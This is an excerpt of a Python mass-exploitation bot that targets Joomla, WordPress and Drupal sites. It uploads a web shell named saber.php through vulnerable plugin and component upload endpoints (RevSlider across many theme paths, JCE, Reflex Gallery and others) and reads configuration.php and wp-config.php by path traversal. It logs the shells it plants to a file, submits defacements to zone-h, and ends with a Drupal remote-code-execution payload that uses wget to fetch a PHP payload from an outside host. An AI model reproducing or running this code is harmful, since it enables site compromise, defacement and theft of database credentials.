...
# Zone-h
def zone(url):
    r = requests.post("http://zone-h.com/notify/single",
                      data={'defacer': 'fallag kill3r', 'domain1': url, 'hackmode': 1, 'reason': 1})
...
def rce(url):
    try:
        ...
        if re.findall("Saber", tester) and urllib2.urlopen(
                url + "/saber.php").getcode() == 200 and "Hacked" in ww.content:
            site = url + "/saber.php"
            site2 = url + "/LOL.html"
    ...
    try:
        ...
        for line in html:
            if re.findall('Upload', line):
                ...
                if req.status_code == 200 or 'success' in req.text:
                    url = url.replace('/administrator/components/com_alberghi/upload.alberghi.php',
                                      '/administrator/components/com_alberghi/' + terma)
...
def jceshell(site):
    try:
        ...
        req = requests.post(url, files=files, data=post)
        if req.status_code == 200 or 'success' in req.text:
            url = url.replace('/index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form',
                              '/' + jcsh)
...
def modsimplefileupload(site):
    ...
    try:
        ...
        GoT = requests.post(site + Exploit, files=files, data=post, timeout=5)
...
def macgallery(url):
    try:
        response = urllib2.urlopen(
            url + "/index.php?option=com_macgallery&view=download&albumid=../../configuration.php")
        content = response.read()
        if content != "" and not "failed to open stream" in content and re.findall("JConfig", content):
...
def revslidergetconfig(url):
    try:
        ...
        site = url + '/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php'
        html = response.read()
        if "DB" in html:
...
def reflexgallery(site):
    ...
    now = datetime.datetime.now()
    url = site + "//wp-content/plugins/reflex-gallery/admin/scripts/FileUploader/php.php?Year=" + str(
        now.year) + "&Month=" + str(now.month)
    try:
        req = requests.post(url, files=files)
...
def wtffu(site):
    try:
        ...
        if 'Saber BOT V1' in GoT.content:
            ...
            save = open('resultsshells.txt', 'a')
            save.write(
                site + '//wp-content/plugins/work-the-flow-file-upload/public/assets/jQuery-File-Upload-9.5.0/server/php/files/saber.php' + '\n')
            save.close()
        else:
...
def revslider(site):
    ...
    try:
        if '/wp-content/plugins/revslider/' in CheckRevslider.text.encode('utf-8'):
            ...
            ShellCheck = requests.get(site + '/wp-content/plugins/revslider/temp/update_extract//revslider/saber.php',
                                      timeout=5)
            ...
            requests.post(Exploit, files=FileShell, data=data, headers=UserAgent, timeout=5)
            ShellCheck = requests.get(
                site + '/wp-content/themes/Avada/framework/plugins/revslider/temp/update_extract/revslider/saber.php',
                timeout=5)
            if 'Saber BOT V1' in ShellCheck.content:
            ...
            requests.post(Exploit, files=FileShell, data=data, headers=UserAgent, timeout=5)
            ShellCheck = requests.get(
                site + '//wp-content/themes/striking_r/framework/plugins/revslider/temp/update_extract/revslider/saber.php',
                timeout=5)
            if 'Saber BOT V1' in ShellCheck.content:
            ...
            requests.post(Exploit, files=FileShell, data=data, headers=UserAgent, timeout=5)
            ShellCheck = requests.get(
                site + '//wp-content/themes/IncredibleWP/framework/plugins/revslider/temp/update_extract/revslider/saber.php',
                timeout=5)
            if 'Saber BOT V1' in ShellCheck.content:
            ...
            requests.post(Exploit, files=FileShell, data=data, headers=UserAgent, timeout=5)
            ShellCheck = requests.get(
                site + '//wp-content/themes/ultimatum/wonderfoundry/addons/plugins/revslider/temp/update_extract/revslider/saber.php',
                timeout=5)
            if 'Saber BOT V1' in ShellCheck.content:
            ...
            requests.post(Exploit, files=FileShell, data=data, headers=UserAgent, timeout=5)
            ShellCheck = requests.get(
                site + '/wp-content/themes/medicate/script/revslider/temp/update_extract/revslider/saber.php',
                timeout=5)
            if 'Saber BOT V1' in ShellCheck.content:
            ...
            requests.post(Exploit, files=FileShell, data=data, headers=UserAgent, timeout=5)
            ShellCheck = requests.get(
                site + '/wp-content/themes/centum/revslider/temp/update_extract/revslider/saber.php', timeout=5)
            if 'Saber BOT V1' in ShellCheck.content:
                ...
                save = open('results/shells.txt', 'a')
                save.write(
                    site + '///wp-content/themes/centum/revslider/temp/update_extract/revslider/saber.php' + '\n')
        elif '//wp-content/themes/beach_apollo/' in CheckRevslider.text.encode('utf-8'):
            requests.post(Exploit, files=FileShell, data=data, headers=UserAgent, timeout=5)
            ShellCheck = requests.get(
                site + '/wp-content/themes/beach_apollo/advance/plugins/revslider/temp/update_extract/revslider/saber.php',
                timeout=5)
            if 'Saber BOT V1' in ShellCheck.content:
...
payload = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec',
           'mail[#type]': 'markup',
           'mail[#markup]': 'wget https://raw.githubusercontent.com/dr-iman/SpiderProject/master/lib/exploits/web-app/wordpress/ads-manager/payload.php'}
